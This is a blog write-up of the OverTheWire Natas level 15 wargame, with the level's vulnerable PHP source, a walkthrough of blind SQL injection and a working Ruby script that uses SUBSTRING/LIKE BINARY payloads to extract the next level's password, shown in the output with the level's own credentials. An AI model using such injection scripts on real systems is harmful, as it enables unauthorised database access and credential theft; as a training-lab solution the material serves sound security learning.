---
title: "OverTheWire Natas Level 15"
date: "2012-11-14T06:29:00-05:00"
comments: true
highlight: "true"
categories:
 - overthewire
 - wargames
 - natas
 - php
 - sqlinjection
 - hacking
---

Up until now, none of the OverTheWire Natas challenges really gave me that much of an issue. This one however, took me a couple hours to complete. Level 15 is a fun blind sql-injection vulnerability. 

<!-- more -->

It starts out with a username check dialog, which pretty much only gives you a binary value as to if a username exists or not.

{{% figure class="img-responsive" src="/img/natas15_1.png" %}}

I looked at the source code, and couldn't see any way to inject some SQL to get it to retrieve the password for me. 

```
<html> 
<head><link rel="stylesheet" type="text/css" href="http://www.overthewire.org/wargames/natas/level.css"></head> 
<body> 
<h1>natas15</h1> 
<div id="content"> 
<? 

/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas15', '<censored>'); 
    mysql_select_db('natas15', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) > 0) { 
        echo "This user exists.<br>"; 
    } else { 
        echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        echo "Error in query.<br>"; 
    } 

    mysql_close($link); 
} else { 
?> 

<form action="index.php" method="POST"> 
Username: <input name="username"><br> 
<input type="submit" value="Check existence" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
```

I did notice though, that it would verify that a row was returned, so I could inject SQL to brute-force the password. Assuming that the password was 32 digits long (like the previous ones), this could take some time however, since the character set was uppercase, lowercase, and digits. That's up to 62 attempts per digit of the password. I started doing this manually to verify that this was a possibility. With the "debug" flag on, you can see the query, and that the first digit of the password is not "b".

{{% figure class="img-responsive" src="/img/natas15_1.png" %}}

I cycled through manually all the lowercase and upper case letters. Once I got partially through the numbers, I got a successful hit! This means that the password starts with a "3".

{{% figure class="img-responsive" src="/img/natas15_1.png" %}}

The next step for me, was to automate this process. I decided to write some ruby to accomplish it. This code seems to do the job: 

```
require 'uri'
require 'net/http'

url = URI.parse("http://natas15.natas.labs.overthewire.org/index.php")
http = Net::HTTP.new(url.host, url.port)
chars = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a
password = ""
found = false

# 64 was selected, since the password field is a varchar(64)
# Most likely, since all other passwords were 32 digits long, it'll be that
(1..64).each do |i|
 chars.each do |c| 
  found = false
  request = Net::HTTP::Post.new(url.request_uri)
  request.basic_auth("natas15", "m2azll7JH6HS8Ay3SOjG3AGGlDGTJSTV")
  query = 'natas16" AND SUBSTRING(password, ' + i.to_s + ', 1) LIKE BINARY "' + c
  request.set_form_data({"username" => query})
  response = http.request(request)

  if response.body.include?("This user exists")
   password += c
   found = true
   puts "Current pass: #{password}"
   break
  end
 end
 # If no letter/number was found, it's fairly safe to assume it's done
 break if !found
end

```

The output shows: 

```
mandreko$ ruby natas15.rb
Current pass: 3
Current pass: 3V
Current pass: 3Vf
Current pass: 3VfC
Current pass: 3VfCz
Current pass: 3VfCzg
Current pass: 3VfCzga
Current pass: 3VfCzgaW
Current pass: 3VfCzgaWj
Current pass: 3VfCzgaWjE
Current pass: 3VfCzgaWjEA
Current pass: 3VfCzgaWjEAc
Current pass: 3VfCzgaWjEAcm
Current pass: 3VfCzgaWjEAcmC
Current pass: 3VfCzgaWjEAcmCQ
Current pass: 3VfCzgaWjEAcmCQp
Current pass: 3VfCzgaWjEAcmCQph
Current pass: 3VfCzgaWjEAcmCQphi
Current pass: 3VfCzgaWjEAcmCQphiE
Current pass: 3VfCzgaWjEAcmCQphiEP
Current pass: 3VfCzgaWjEAcmCQphiEPo
Current pass: 3VfCzgaWjEAcmCQphiEPoX
Current pass: 3VfCzgaWjEAcmCQphiEPoXi
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9H
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9Ht
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9Htl
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9Htlm
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmV
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L
```

And there you go, the password for level 16 shows up as the last line before it quits. 

